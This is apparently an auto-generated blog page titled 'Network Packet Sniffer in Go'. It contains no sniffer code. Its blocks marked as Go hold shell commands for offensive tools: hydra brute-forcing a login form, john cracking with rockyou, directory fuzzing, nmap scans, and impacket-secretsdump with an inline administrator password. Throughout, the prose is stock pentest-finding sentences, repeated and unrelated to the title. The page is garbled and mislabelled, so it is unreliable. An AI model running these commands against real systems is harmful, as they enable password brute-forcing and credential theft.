---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "fuzzer, scanner, tool, automation, go"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-465.html"
URL_IMAGES: ""
Date: "2026-01-18"
Tags: "Fuzzer, Scanner, Tool, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-465"
Permalink: "/scripting/script-network-packet-sniffer-465.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `crackmapexec`
- `pwncat`
- `evil-winrm`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.145.56/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.80.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5985,464,53 10.117.209.83 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
gobuster dir -u http://10.63.214.187/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p5986,110,5986 10.79.147.58 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.89.107 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.222.149/FUZZ
feroxbuster -h
```

### Advanced Options

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.46.191.219
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.124.150.224/FUZZ
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 20.31s
```
